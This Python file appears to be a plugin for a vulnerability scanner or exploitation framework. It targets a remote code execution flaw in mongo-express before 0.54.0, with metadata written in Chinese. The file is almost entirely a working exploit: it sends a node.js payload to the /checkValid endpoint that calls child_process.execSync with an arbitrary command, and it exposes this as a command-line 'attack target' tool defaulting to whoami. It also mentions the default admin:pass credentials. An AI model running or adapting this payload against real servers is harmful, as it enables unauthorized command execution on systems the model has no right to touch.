# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "mongo-express 远程代码执行漏洞",
        "version": "mongo-express， 0.54.0 之前的版本",
        "description": "mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（admin:pass），则可以执行任意node.js代码。",
        "references": ["-"],
    }

    def url(self) -> dict:
        res = self.exec_cmd(self.target.value, 'whoami')
        if res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='GET',
            url=urllib.parse.urljoin(url, './checkValid'),
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=15,
            data=f"document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"{cmd}\")"
        )
        if r.status_code == 200 and 'Valid' in r.text:
            return True
